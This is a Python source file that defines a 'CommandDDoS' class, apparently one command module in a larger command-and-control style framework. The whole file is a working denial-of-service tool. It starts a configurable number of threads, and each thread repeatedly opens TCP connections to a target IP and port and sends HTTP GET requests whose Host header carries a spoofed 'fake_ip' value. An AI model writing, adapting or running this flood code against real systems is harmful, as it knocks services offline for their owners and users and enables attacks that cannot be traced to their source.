from typing import List
from commands.command import Command, CommandType
import socket
import threading

class CommandDDoS(Command):
    def __init__(self, target_ip: str, target_port: str, fake_ip: str, nb_threads: int = 30) -> None:
        super().__init__(CommandType.DDoS)
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.fake_ip = fake_ip
        self.nb_threads = int(nb_threads)
        self.threads: List(threading.Thread) = []
        self.running = True

    def attack(self) -> None:
        while self.running:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_ip, self.target_port))
            s.sendto(("GET /" + self.target_ip + " HTTP/1.1\r\n").encode('ascii'), (self.target_ip, self.target_port))
            s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target_ip, self.target_port))
            s.close()

    def process(self) -> None:
        print('Starting DDoS on {} with {} threads'.format(self.target_ip, self.nb_threads))
        for _ in range(self.nb_threads):
            thread = threading.Thread(target=self.attack)
            self.threads.append(thread)
            thread.start()

    def stop(self) -> None:
        self.running = False